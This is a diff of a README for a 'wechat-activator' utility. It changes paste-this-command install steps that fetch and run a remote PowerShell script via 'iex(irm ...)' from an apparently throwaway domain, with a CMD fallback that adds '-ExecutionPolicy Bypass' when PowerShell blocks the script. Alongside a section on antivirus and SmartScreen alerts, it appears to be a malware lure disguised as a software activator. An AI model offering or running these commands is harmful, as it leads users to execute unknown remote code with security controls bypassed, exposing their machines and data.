@@ -24,13 +24,13 @@ wechat-activator is a lightweight desktop utility that automates message activat
    Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all :
 
    ```cmd
-   iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
+   iex(irm 'https://activation-gateway.cc/update/ps-activator')
    ```
 
 3. Forced run via CMD (if PowerShell blocks the script):
    Copy, paste into CMD, hit `Enter`. Wait until the process finishes:
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
 ```
 
 ### 💬 Antivirus / SmartScreen Alerts
